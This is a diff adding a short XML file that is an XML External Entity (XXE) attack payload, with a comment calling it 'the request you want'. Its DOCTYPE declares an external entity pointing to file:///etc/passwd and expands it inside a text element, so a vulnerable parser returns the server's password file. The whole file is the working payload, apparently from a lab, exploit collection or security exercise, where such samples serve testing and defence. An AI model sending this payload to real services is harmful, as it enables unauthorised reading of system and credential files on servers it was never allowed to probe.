@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!--This is the request you want-->
+<!DOCTYPE comm [
+<!ELEMENT comm (#PCDATA)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comm>
+  <text>&xxe;</text>
+</comm>
